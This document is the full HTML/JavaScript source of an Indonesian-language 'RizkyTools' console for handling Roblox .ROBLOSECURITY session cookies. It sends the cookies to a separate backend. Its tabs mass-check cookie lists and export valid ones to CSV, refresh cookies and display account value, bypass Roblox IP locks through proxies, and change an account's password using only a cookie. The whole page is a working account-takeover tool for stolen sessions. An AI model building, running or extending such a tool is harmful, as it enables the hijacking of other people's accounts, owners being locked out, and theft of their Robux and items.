<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RizkyTools | Checker Console</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
:root {
    --bg: #000000; --panel: #0a0a0a; --border: #222222; --text: #ffffff; --muted: #888888;
    --success: #22c55e; --danger: #ef4444; --warn: #f59e0b;
}
body { background: var(--bg); color: var(--text); min-height: 100vh; padding: 40px 20px; display: flex; flex-direction: column; align-items: center; }
.console { width: 1000px; max-width: 100%; background: var(--panel); border-radius: 16px; border: 1px solid var(--border); padding: 32px; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.9); }
.header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; padding-bottom: 20px; border-bottom: 1px solid var(--border); }
.brand { display: flex; align-items: center; gap: 14px; }
.logo { width: 44px; height: 44px; background: #000; border: 1px solid #fff; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-weight: 800; color: #fff; font-size: 16px; letter-spacing: -0.5px; }
.brand h1 { font-size: 18px; font-weight: 700; letter-spacing: 0.5px; }
.brand small { display: block; font-size: 11px; color: var(--muted); margin-top: 2px; letter-spacing: 1px; }
.status { display: flex; align-items: center; gap: 8px; font-size: 12px; color: var(--muted); font-weight: 500; }
.dot { width: 8px; height: 8px; border-radius: 50%; background: var(--success); box-shadow: 0 0 8px var(--success); }
.stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin-bottom: 24px; }
.stat { background: #000; border: 1px solid var(--border); border-radius: 10px; padding: 16px; text-align: center; }
.stat .num { font-size: 24px; font-weight: 700; color: var(--text); }
.stat .lbl { font-size: 11px; color: var(--muted); letter-spacing: 1px; text-transform: uppercase; margin-top: 4px; font-weight: 600; }
.tabs { display: flex; gap: 8px; margin-bottom: 24px; flex-wrap: wrap; }
.tab { padding: 10px 18px; background: #000; border: 1px solid var(--border); border-radius: 8px; cursor: pointer; font-size: 13px; font-weight: 500; color: var(--muted); transition: all 0.2s; user-select: none; }
.tab:hover { color: var(--text); border-color: #444; }
.tab.active { background: #1a1a1a; border-color: #fff; color: #fff; }
.panel { display: none; animation: fadeIn 0.3s ease; }
.panel.active { display: block; }
@keyframes fadeIn { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: none; } }
label { display: block; font-size: 12px; font-weight: 600; color: var(--muted); margin-bottom: 8px; text-transform: uppercase; letter-spacing: 1px; }
textarea, input[type="text"], input[type="number"], input[type="password"] { width: 100%; background: #000; border: 1px solid var(--border); border-radius: 8px; padding: 14px; color: var(--text); font-family: 'Consolas', monospace; font-size: 13px; resize: vertical; outline: none; margin-bottom: 14px; transition: border-color 0.2s; }
textarea:focus, input:focus { border-color: #fff; }
.btn-group { display: flex; gap: 10px; margin-top: 6px; flex-wrap: wrap; align-items: center; }
button { padding: 10px 20px; border: none; border-radius: 8px; font-weight: 600; font-size: 13px; cursor: pointer; transition: all 0.2s; display: inline-flex; align-items: center; justify-content: center; gap: 6px; }
.btn-primary { background: #fff; color: #000; }
.btn-primary:hover { background: #ccc; }
.btn-secondary { background: #222; color: #fff; }
.btn-secondary:hover { background: #333; }
.btn-danger { background: #2a1010; color: var(--danger); border: 1px solid #4a1a1a; }
.btn-danger:hover { background: #4a1a1a; color: #fff; }
.btn-warn { background: var(--danger); color: #fff; }
.btn-success { background: var(--success); color: #fff; }
.btn-sm { padding: 8px 14px; font-size: 12px; border-radius: 6px; }
.result { margin-top: 16px; padding: 20px; background: #000; border: 1px solid var(--border); border-radius: 10px; font-size: 13px; display: none; line-height: 1.6; }
.result.valid { border-color: var(--success); }
.result.invalid { border-color: var(--danger); }
.profile-header { display: flex; align-items: center; gap: 16px; margin-bottom: 20px; padding-bottom: 16px; border-bottom: 1px solid var(--border); }
.avatar-img { width: 64px; height: 64px; border-radius: 50%; border: 2px solid var(--border); object-fit: cover; background: #111; }
.profile-info h2 { font-size: 18px; font-weight: 700; margin-bottom: 4px; }
.profile-info p { font-size: 13px; color: var(--muted); }
.grid-info { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px; }
.info-box h4 { color: var(--muted); font-size: 11px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; border-bottom: 1px solid var(--border); padding-bottom: 4px; }
.info-row { display: flex; justify-content: space-between; margin-bottom: 4px; font-family: monospace; }
.info-row span:first-child { color: var(--muted); }
.info-row span:last-child { color: var(--text); font-weight: 600; }
.section-title { font-size: 12px; font-weight: 700; color: #fff; text-transform: uppercase; letter-spacing: 1px; margin: 20px 0 10px 0; display: flex; align-items: center; gap: 8px; }
.section-title::after { content: ''; flex: 1; height: 1px; background: var(--border); }
.telemetry-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(90px, 1fr)); gap: 10px; }
.telemetry-item { background: #0a0a0a; border: 1px solid var(--border); border-radius: 8px; padding: 8px; text-align: center; }
.telemetry-item img { width: 100%; aspect-ratio: 1/1; object-fit: cover; border-radius: 6px; margin-bottom: 6px; }
.telemetry-item .name { font-size: 10px; color: var(--text); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; font-weight: 500; }
.telemetry-item .price { font-size: 11px; color: var(--success); font-weight: 700; margin-top: 2px; }
.cookie-box { background: #0a0a0a; padding: 12px; border-radius: 8px; border: 1px solid var(--border); font-family: monospace; font-size: 12px; color: var(--success); word-break: break-all; margin-top: 10px; user-select: all; }
.tax-inputs { display: flex; gap: 12px; align-items: flex-end; margin-top: 10px; flex-wrap: wrap; }
.tax-inputs input { flex: 1; min-width: 150px; margin-bottom: 0; }
.tax-inputs select { padding: 14px; background: #000; border: 1px solid var(--border); border-radius: 8px; color: var(--text); outline: none; width: 200px; }
.toast-container { position: fixed; bottom: 24px; right: 24px; z-index: 9999; display: flex; flex-direction: column; gap: 10px; }
.toast { background: #111; border: 1px solid var(--border); border-left: 3px solid #fff; border-radius: 6px; padding: 14px 20px; color: var(--text); font-size: 13px; font-weight: 500; box-shadow: 0 10px 30px rgba(0,0,0,0.8); animation: slideInRight 0.3s ease; }
.toast.error { border-left-color: var(--danger); }
.toast.success { border-left-color: var(--success); }
@keyframes slideInRight { from { opacity: 0; transform: translateX(20px); } to { opacity: 1; transform: none; } }
.footer { text-align: center; margin-top: 24px; font-size: 12px; color: var(--muted); }
input[type="file"] { display: none; }
@media (max-width: 768px) { .console { padding: 20px; } .stats { grid-template-columns: repeat(2, 1fr); } .grid-info { grid-template-columns: 1fr; } .tab { padding: 8px 12px; font-size: 12px; } .btn-group button { flex: 1; } }
</style>
</head>
<body>
<div class="toast-container" id="toastContainer"></div>
<div class="console">
    <div class="header">
        <div class="brand"><div class="logo">RZ</div><div><h1>RizkyTools</h1><small>Checker Console</small></div></div>
        <div class="status"><div class="dot"></div><span>Online</span></div>
    </div>
    <div class="stats">
        <div class="stat"><div class="num" id="statTotal">0</div><div class="lbl">Checked</div></div>
        <div class="stat"><div class="num" id="statValid" style="color:var(--success)">0</div><div class="lbl">Valid</div></div>
        <div class="stat"><div class="num" id="statInvalid" style="color:var(--danger)">0</div><div class="lbl">Invalid</div></div>
        <div class="stat"><div class="num" id="statPremium" style="color:var(--warn)">0</div><div class="lbl">Premium</div></div>
    </div>
    
    <div class="tabs">
        <div class="tab active" onclick="switchTab('checker', this)">Checker</div>
        <div class="tab" onclick="switchTab('mass', this)">Mass Checker</div>
        <div class="tab" onclick="switchTab('refresh', this)">Refresh</div>
        <div class="tab" onclick="switchTab('tax', this)">Tax</div>
        <div class="tab" onclick="switchTab('lookup', this)">Lookup</div>
        <div class="tab" onclick="switchTab('bypass', this)">Bypass</div>
        <div class="tab" onclick="switchTab('changepass', this)">Ganti Pass</div>
    </div>

    <div id="panel-checker" class="panel active">
        <div style="display:flex; justify-content:space-between; align-items:center;"><label>.ROBLOSECURITY COOKIE</label><div style="display:flex; gap:6px;"><button class="btn-secondary btn-sm" onclick="pasteText('cookieInput')">📋 Paste</button><button class="btn-danger btn-sm" onclick="clearText('cookieInput')">✕ Clear</button></div></div>
        <textarea id="cookieInput" rows="3" placeholder="Paste cookie..."></textarea>
        <div class="btn-group"><button class="btn-primary" onclick="checkCookie()" style="width:100%;">Refresh & Check</button></div>
        <div id="checkerResult" class="result"></div>
    </div>

    <div id="panel-mass" class="panel">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
            <label>MASS CHECKER</label>
            <div style="display:flex; gap:6px;">
                <button class="btn-secondary btn-sm" onclick="pasteText('massInput')">📋 Paste</button>
                <button class="btn-secondary btn-sm" onclick="document.getElementById('fileInput').click()">📁 Upload .txt</button>
                <button class="btn-danger btn-sm" onclick="clearText('massInput')">✕ Clear</button>
            </div>
        </div>
        <input type="file" id="fileInput" accept=".txt" onchange="handleFileUpload(event)">
        <textarea id="massInput" rows="5" placeholder="cookie1&#10;cookie2..."></textarea>
        <div class="btn-group"><button class="btn-primary" onclick="massCheck()">Check All</button><button class="btn-secondary" onclick="exportCSV()">Export CSV</button></div>
        <div id="massResult" class="result" style="white-space: pre-wrap; font-family: monospace;"></div>
    </div>

    <div id="panel-refresh" class="panel">
        <div style="display:flex; justify-content:space-between; align-items:center;"><label>.ROBLOSECURITY COOKIE</label><div style="display:flex; gap:6px;"><button class="btn-secondary btn-sm" onclick="pasteText('refreshCookie')">📋 Paste</button><button class="btn-danger btn-sm" onclick="clearText('refreshCookie')">✕ Clear</button></div></div>
        <textarea id="refreshCookie" rows="3" placeholder="Paste cookie..."></textarea>
        <div class="btn-group"><button class="btn-primary" onclick="refreshCookie()">Refresh</button></div>
        <div id="refreshResult" class="result"></div>
    </div>

    <div id="panel-tax" class="panel">
        <label>TAX CALCULATOR</label>
        <div class="tax-inputs"><input type="number" id="taxAmount" placeholder="Jumlah Robux" min="1"><select id="taxMode"><option value="charge">Saya Jual (Charge)</option><option value="receive">Saya Terima (Receive)</option></select><button class="btn-primary" onclick="calcTax()">Hitung</button></div>
        <div id="taxResult" class="result" style="text-align: center; font-size: 16px;"></div>
    </div>

    <div id="panel-lookup" class="panel">
        <div style="display:flex; justify-content:space-between; align-items:center;"><label>USERNAME</label><div style="display:flex; gap:6px;"><button class="btn-secondary btn-sm" onclick="pasteText('lookupName')">📋 Paste</button><button class="btn-danger btn-sm" onclick="clearText('lookupName')">✕ Clear</button></div></div>
        <input type="text" id="lookupName" placeholder="Masukkan username...">
        <div class="btn-group"><button class="btn-primary" onclick="lookupUser()" style="width:100%;">Cari Akun</button></div>
        <div id="lookupResult" class="result"></div>
    </div>

    <div id="panel-bypass" class="panel">
        <div style="display:flex; justify-content:space-between; align-items:center;"><label>BYPASS IP LOCK</label><div style="display:flex; gap:6px;"><button class="btn-secondary btn-sm" onclick="pasteText('bypassCookie')">📋 Paste</button><button class="btn-danger btn-sm" onclick="clearText('bypassCookie')">✕ Clear</button></div></div>
        <textarea id="bypassCookie" rows="2" placeholder="Paste cookie..."></textarea>
        <input type="text" id="bypassTarget" placeholder="Target URL" value="https://users.roblox.com/v1/users/authenticated">
        <div class="btn-group"><button class="btn-warn" onclick="bypassCheck()" style="width:100%;">Coba Bypass</button></div>
        <div id="bypassResult" class="result"></div>
    </div>

    <div id="panel-changepass" class="panel">
        <div style="display:flex; justify-content:space-between; align-items:center;"><label>.ROBLOSECURITY COOKIE</label><div style="display:flex; gap:6px;"><button class="btn-secondary btn-sm" onclick="pasteText('passCookie')">📋 Paste</button><button class="btn-danger btn-sm" onclick="clearText('passCookie')">✕ Clear</button></div></div>
        <textarea id="passCookie" rows="2" placeholder="Paste cookie di sini..."></textarea>
        <label>PASSWORD BARU</label>
        <input type="password" id="newPassword" placeholder="Minimal 8 karakter...">
        <div class="btn-group"><button class="btn-primary" onclick="changePassword()" style="width:100%;">Ganti Password & Logout</button></div>
        <div id="passResult" class="result"></div>
    </div>
</div>
<div class="footer">RizkyTools v2.5</div>

<script>
// GANTI URL DI BAWAH INI DENGAN URL RENDER KAMU NANTI
const API_BASE = 'https://nama-render-kamu.onrender.com'; 
let massData = [];
let lastRefreshedCookie = '';

function pasteText(id) { navigator.clipboard.readText().then(text => { document.getElementById(id).value = text; toast('Berhasil di-paste!', 'success'); }).catch(err => { toast('Gagal paste.', 'error'); }); }
function clearText(id) { document.getElementById(id).value = ''; toast('Input dibersihkan.'); }
function handleFileUpload(event) { const file = event.target.files[0]; if (!file) return; const reader = new FileReader(); reader.onload = function(e) { document.getElementById('massInput').value = e.target.result; toast('File berhasil di-load!', 'success'); }; reader.readAsText(file); event.target.value = ''; }
function switchTab(name, el) { document.querySelectorAll('.tab').forEach(t => t.classList.remove('active')); document.querySelectorAll('.panel').forEach(p => p.classList.remove('active')); el.classList.add('active'); document.getElementById(`panel-${name}`).classList.add('active'); }
function show(el, cls, htmlOrText, isHtml = false) { el.style.display = 'block'; el.className = 'result ' + (cls || ''); if (isHtml) el.innerHTML = htmlOrText; else el.textContent = htmlOrText; }
function toast(msg, type) { const c = document.getElementById('toastContainer'); const t = document.createElement('div'); t.className = 'toast ' + (type || ''); t.textContent = msg; c.appendChild(t); setTimeout(() => { t.style.opacity = '0'; t.style.transition = 'opacity 0.3s'; setTimeout(() => t.remove(), 300); }, 3000); }
function updateStats(total, valid, invalid, premium) { document.getElementById('statTotal').textContent = total; document.getElementById('statValid').textContent = valid; document.getElementById('statInvalid').textContent = invalid; document.getElementById('statPremium').textContent = premium || 0; }

function renderAccountCard(u, t, isLookup = false) {
    let limitedHtml = '';
    if (t.topLimited && t.topLimited.length > 0) {
        limitedHtml = `<div class="telemetry-grid">`;
        t.topLimited.forEach(item => { limitedHtml += `<div class="telemetry-item"><img src="${item.image}" onerror="this.src='https://www.roblox.com/asset-thumbnail/image?assetId=0&width=150&height=150&format=png'"><div class="name" title="${item.name}">${item.name}</div><div class="price">${item.rap} R$</div></div>`; });
        limitedHtml += `</div>`;
    } else { limitedHtml = `<div style="font-size:12px; color:var(--muted);">Tidak ada limited items terdeteksi.</div>`; }

    let gamesHtml = '';
    if (t.topGames && t.topGames.length > 0) {
        gamesHtml = `<div class="telemetry-grid">`;
        t.topGames.forEach(g => { gamesHtml += `<div class="telemetry-item"><img src="${g.image}" onerror="this.style.display='none'"><div class="name" title="${g.name}">${g.name}</div></div>`; });
        gamesHtml += `</div>`;
    } else { gamesHtml = `<div style="font-size:12px; color:var(--muted);">Data game tidak tersedia.</div>`; }
    
    const avatarImg = u.avatarUrl ? u.avatarUrl : 'https://www.roblox.com/headshot-thumbnail/image?userId=1&width=150&height=150&format=png';
    const robuxText = (t.robux !== null && t.robux !== undefined) ? t.robux + ' R$' : 'N/A (Butuh Cookie)';

    return `
        <div class="profile-header">
            <img src="${avatarImg}" class="avatar-img" onerror="this.src='https://www.roblox.com/headshot-thumbnail/image?userId=1&width=150&height=150&format=png'">
            <div class="profile-info"><h2>${u.name}</h2><p>${u.displayName} • ID: ${u.id}</p></div>
        </div>
        <div class="grid-info">
            <div class="info-box">
                <h4>Account</h4>
                <div class="info-row"><span>Age</span><span>${u.ageDays || 'N/A'}</span></div>
                <div class="info-row"><span>Banned</span><span style="color:${u.isBanned ? 'var(--danger)' : 'var(--success)'}">${u.isBanned ? 'YES' : 'NO'}</span></div>
            </div>
            <div class="info-box">
                <h4>Telemetry</h4>
                <div class="info-row"><span>Robux</span><span style="color:var(--success)">${robuxText}</span></div>
                <div class="info-row"><span>Premium</span><span>${t.premium ? 'ACTIVE' : 'NO'}</span></div>
                <div class="info-row"><span>RAP Total</span><span>${t.rap} R$</span></div>
                <div class="info-row"><span>Limiteds</span><span>${t.limitedCount} items</span></div>
            </div>
        </div>
        <div class="section-title">Top Limited Items</div>${limitedHtml}
        <div class="section-title">Top Games</div>${gamesHtml}
    `;
}

async function checkCookie() {
    const cookie = document.getElementById('cookieInput').value.trim();
    const resultDiv = document.getElementById('checkerResult');
    if (!cookie) return toast('Cookie kosong!', 'error');
    show(resultDiv, '', '<div style="color:var(--muted); text-align:center;">Scanning...</div>', true);
    
    try {
        const res = await fetch(`${API_BASE}/api/check-cookie`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cookie }) });
        const data = await res.json();
        if (data.valid) {
            show(resultDiv, 'valid', renderAccountCard(data.user, data.telemetry), true);
            updateStats(1, 1, 0, data.telemetry.premium ? 1 : 0);
            toast('Account valid!', 'success');
        } else {
            show(resultDiv, 'invalid', `❌ INVALID\n${data.error}`);
            updateStats(1, 0, 1, 0);
            toast('Cookie invalid', 'error');
        }
    } catch (e) { show(resultDiv, 'invalid', '❌ Server error.'); toast('Server error', 'error'); }
}

async function massCheck() {
    const raw = document.getElementById('massInput').value.trim();
    const resultDiv = document.getElementById('massResult');
    if (!raw) return toast('Paste / upload dulu!', 'error');
    const cookies = raw.split('\n').map(c => c.trim()).filter(Boolean);
    if (cookies.length > 30) return toast('Max 30 cookie!', 'error');
    
    show(resultDiv, '', `Checking ${cookies.length} cookies...`);
    try {
        const res = await fetch(`${API_BASE}/api/mass-check`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cookies }) });
        const data = await res.json();
        if (data.error) return show(resultDiv, 'invalid', `❌ ${data.error}`);
        
        massData = data.results;
        let out = `📊 RESULTS\nTotal: ${data.total} | Valid: ${data.validCount} | Invalid: ${data.invalidCount}\n\n`;
        data.results.forEach((r, i) => {
            if (r.valid) out += `[${i+1}] ✅ ${r.username} | ${r.robux ?? '?'}R$\n`;
            else out += `[${i+1}] ❌ INVALID\n`;
        });
        
        show(resultDiv, data.validCount > 0 ? 'valid' : 'invalid', out);
        updateStats(data.total, data.validCount, data.invalidCount, 0);
        toast(`Selesai: ${data.validCount} valid.`);
    } catch (e) { show(resultDiv, 'invalid', '❌ Server error.'); }
}

function exportCSV() {
    if (massData.length === 0) return toast('Belum ada data!', 'error');
    const rows = [['No', 'Valid', 'Username', 'DisplayName', 'ID', 'Robux', 'Premium', 'AgeDays', 'Error']];
    massData.forEach((r, i) => rows.push([i + 1, r.valid ? 'YES' : 'NO', r.username || '', r.displayName || '', r.id || '', r.robux ?? '', r.premium ? 'YES' : 'NO', r.ageDays || '', r.error || '']));
    const csv = rows.map(r => r.map(c => `"${String(c).replace(/"/g, '""')}"`).join(',')).join('\n');
    const blob = new Blob([csv], { type: 'text/csv' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = `rizkytools_mass_${Date.now()}.csv`;
    a.click();
    toast('CSV exported!', 'success');
}

async function refreshCookie() {
    const cookie = document.getElementById('refreshCookie').value.trim();
    const resultDiv = document.getElementById('refreshResult');
    if (!cookie) return toast('Cookie kosong!', 'error');
    
    show(resultDiv, '', 'Refreshing...');
    try {
        const res = await fetch(`${API_BASE}/api/refresh-cookie`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cookie }) });
        const data = await res.json();
        if (data.error) return show(resultDiv, 'invalid', `❌ ${data.error}`);
        
        lastRefreshedCookie = data.newCookie || cookie;
        const avatarImg = data.user.avatarUrl ? data.user.avatarUrl : 'https://www.roblox.com/headshot-thumbnail/image?userId=1&width=150&height=150&format=png';
        
        let out = `
            <div class="profile-header">
                <img src="${avatarImg}" class="avatar-img" onerror="this.src='https://www.roblox.com/headshot-thumbnail/image?userId=1&width=150&height=150&format=png'">
                <div class="profile-info"><h2>${data.user.name}</h2><p>${data.user.displayName}</p></div>
            </div>
            <div style="color:var(--success); font-weight:700; margin-bottom:12px;">✅ COOKIE REFRESHED</div>
            <div style="font-size:12px; color:var(--muted); margin-top:10px;">New Cookie:</div>
            <div class="cookie-box">${lastRefreshedCookie}</div>
            <button class="btn-success" style="margin-top:12px; width:100%;" onclick="navigator.clipboard.writeText('${lastRefreshedCookie}'); toast('Cookie disalin!');">📋 Salin Cookie Baru</button>
        `;
        show(resultDiv, 'valid', out, true);
    } catch (e) { show(resultDiv, 'invalid', '❌ Server error.'); }
}

async function calcTax() {
    const amount = parseFloat(document.getElementById('taxAmount').value);
    const mode = document.getElementById('taxMode').value;
    const resultDiv = document.getElementById('taxResult');
    if (!amount || amount <= 0) return toast('Jumlah tidak valid!', 'error');
    try {
        const res = await fetch(`${API_BASE}/api/tax`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ amount, mode }) });
        const data = await res.json();
        show(resultDiv, 'valid', `Price: <b>${data.price} R$</b> | Tax: ${data.tax} R$ | Net: <b style="color:var(--success)">${data.net} R$</b>`, true);
    } catch (e) { show(resultDiv, 'invalid', 'Error koneksi.'); }
}

async function lookupUser() {
    const username = document.getElementById('lookupName').value.trim();
    const resultDiv = document.getElementById('lookupResult');
    if (!username) return toast('Masukkan username!', 'error');
    
    show(resultDiv, '', 'Mencari...');
    try {
        const res = await fetch(`${API_BASE}/api/lookup`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username }) });
        const data = await res.json();
        if (data.error) return show(resultDiv, 'invalid', `❌ ${data.error}`);
        
        const u = { id: data.id, name: data.name, displayName: data.displayName, ageDays: data.ageDays, isBanned: data.isBanned, avatarUrl: data.avatarUrl };
        const t = { robux: data.telemetry?.robux, premium: data.telemetry?.premium, spend: 0, rap: data.telemetry?.rap, limitedCount: data.telemetry?.limitedCount, topLimited: data.telemetry?.topLimited, topGames: data.telemetry?.topGames };
        
        show(resultDiv, 'valid', renderAccountCard(u, t, true), true);
    } catch (e) { show(resultDiv, 'invalid', 'Error server.'); }
}

async function bypassCheck() {
    const cookie = document.getElementById('bypassCookie').value.trim();
    const target = document.getElementById('bypassTarget').value.trim();
    const resultDiv = document.getElementById('bypassResult');
    if (!cookie) return toast('Cookie kosong!', 'error');
    show(resultDiv, '', 'Mencoba bypass...');
    try {
        const res = await fetch(`${API_BASE}/api/bypass-check`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cookie, target }) });
        const data = await res.json();
        if (data.success) { show(resultDiv, 'valid', `✅ SUCCESS\nProxy : ${data.usedProxy}\nStatus: ${data.status}\nData  : ${JSON.stringify(data.data, null, 2)}`); toast('Bypass berhasil!', 'success'); }
        else { show(resultDiv, 'invalid', `❌ FAILED\nProxy : ${data.usedProxy}\nError : ${data.error}`); toast('Bypass gagal', 'error'); }
    } catch (e) { show(resultDiv, 'invalid', '❌ Server error.'); }
}

async function changePassword() {
    const cookie = document.getElementById('passCookie').value.trim();
    const newPassword = document.getElementById('newPassword').value.trim();
    const resultDiv = document.getElementById('passResult');
    if (!cookie) return toast('Cookie kosong!', 'error');
    if (newPassword.length < 8) return toast('Password minimal 8 karakter!', 'error');

    show(resultDiv, '', '<div style="color:var(--muted); text-align:center;">Memproses ganti password...</div>', true);
    
    try {
        const res = await fetch(`${API_BASE}/api/change-password`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cookie, newPassword })
        });
        const data = await res.json();
        
        if (data.success) {
            show(resultDiv, 'valid', `✅ BERHASIL\n\nPassword akun berhasil diganti menjadi: ${newPassword}\n\n(Catatan: Semua session lama telah di-logout untuk keamanan.)`);
            toast('Password berhasil diganti!', 'success');
        } else {
            show(resultDiv, 'invalid', `❌ GAGAL\n\n${data.error}`);
            toast('Gagal ganti password', 'error');
        }
    } catch (e) {
        show(resultDiv, 'invalid', '❌ Server error.');
    }
}
</script>
</body>
</html>
